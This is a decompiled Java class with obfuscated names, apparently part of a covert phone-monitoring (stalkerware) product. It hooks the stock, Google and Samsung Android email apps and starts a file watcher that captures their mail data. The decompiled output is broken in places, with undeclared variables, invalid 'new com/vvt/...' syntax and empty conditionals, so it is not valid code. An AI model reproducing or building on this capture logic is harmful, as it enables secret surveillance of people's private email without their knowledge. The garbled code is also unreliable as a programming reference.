package com.vvt.capture.email.generic.b;

import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import com.vvt.io.j;
import com.vvt.io.m;

public class a
  implements e, m
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private b d;
  private i e;
  private j f;
  private boolean g;
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    bool = true;
    this.g = bool;
    this.e = parami;
    j localj = this.f;
    if (localj == null)
    {
      localj = j.a();
      this.f = localj;
    }
    bool = a;
    if (bool) {}
    localj = this.f;
    String str = "com.android.email";
    localj.a(str, this);
    bool = a;
    if (bool) {}
    localj = this.f;
    str = "com.google.android.email";
    localj.a(str, this);
    bool = a;
    if (bool) {}
    localj = this.f;
    str = "com.samsung.android.email.provider";
    localj.a(str, this);
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString)
  {
    bool = a;
    if (bool) {}
    try
    {
      bool = b;
      if (bool) {}
      localb = this.d;
      if (localb != null)
      {
        localb = this.d;
        localb.stopWatching();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        b localb;
        bool = c;
        if (!bool) {}
      }
    }
    localb = null;
    this.d = null;
    bool = a;
    if (bool) {}
  }
  
  public void a(String paramString1, String paramString2) {}
  
  public void b()
  {
    bool = a;
    if (bool) {}
    bool = b;
    if (bool) {}
    bool = false;
    Object localObject = null;
    try
    {
      this.g = false;
      localObject = this.d;
      if (localObject != null)
      {
        localObject = this.d;
        ((b)localObject).stopWatching();
      }
      localObject = this.f;
      if (localObject != null)
      {
        localObject = this.f;
        String str = "com.android.email";
        ((j)localObject).a(str);
        localObject = this.f;
        str = "com.google.android.email";
        ((j)localObject).a(str);
        localObject = this.f;
        str = "com.samsung.android.email.provider";
        ((j)localObject).a(str);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    localObject = null;
    this.d = null;
    bool = a;
    if (bool) {}
  }
  
  public void b(String paramString1, String paramString2)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    Object localObject = com.vvt.capture.email.generic.b.a();
    boolean bool2 = a;
    if (bool2) {}
    bool2 = com.vvt.ag.b.a((String)localObject);
    if (!bool2)
    {
      b localb = this.d;
      if (localb == null)
      {
        bool2 = b;
        if (bool2) {}
        localb = new com/vvt/capture/email/generic/b/b;
        localb.<init>(this, (String)localObject);
        this.d = localb;
        localObject = this.d;
        ((b)localObject).startWatching();
      }
    }
    bool1 = a;
    if (bool1) {}
  }
  
  public void c(String paramString1, String paramString2) {}
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/generic/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */